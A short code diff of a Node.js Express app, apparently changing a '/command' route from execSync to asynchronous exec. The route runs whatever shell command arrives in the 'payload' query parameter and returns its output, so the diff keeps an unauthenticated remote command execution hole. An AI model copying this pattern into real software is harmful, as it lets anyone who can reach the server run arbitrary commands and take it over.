@@ -13,10 +13,14 @@ app.get('/', (req, res) => res.send('Welcome'));
 
 app.get('/command', (req, res) => {
     const commandStr = req.query.payload;
-    const output = child_process.execSync(commandStr).toString();
-    if(output !== 0) {
-        res.send(output);
-    }
+    const output = child_process.exec(commandStr, function(error, stdout, stderr){ 
+        if(stdout) {
+            res.send(stdout);
+        }
+        else if(stderr) {
+            res.send(stderr);
+        }
+    });
 });
 
 
